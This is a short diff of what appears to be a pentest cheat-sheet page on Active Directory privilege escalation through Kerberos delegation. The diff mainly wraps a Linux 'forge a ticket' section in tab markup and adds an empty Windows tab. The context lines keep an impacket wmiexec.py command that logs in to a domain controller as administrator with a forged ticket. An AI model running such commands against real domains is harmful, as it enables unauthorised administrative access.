@@ -5,7 +5,13 @@ tags: ["AllowedToDelegate", "gMSADumper", "active driectory", "ad", "Windows", "
 ---
 
 ---
-### Privesc #1: Forge a Ticket (From Linux)
+### Privesc #1: Forge a Ticket
+
+{{< tab set1 tab1 active >}}Linux{{< /tab >}}
+{{< tab set1 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+<div>
 
 ```bash
 # For example, spn: www/dc.example.com (Check Bloodhound)
@@ -23,5 +29,12 @@ sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@dc.example.com
 ```
 
 <small>*Note: impacket-wmiexec may not work*</small>
+
+</div>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+TO-DO
+{{< /tabcontent >}}
 
 <br>
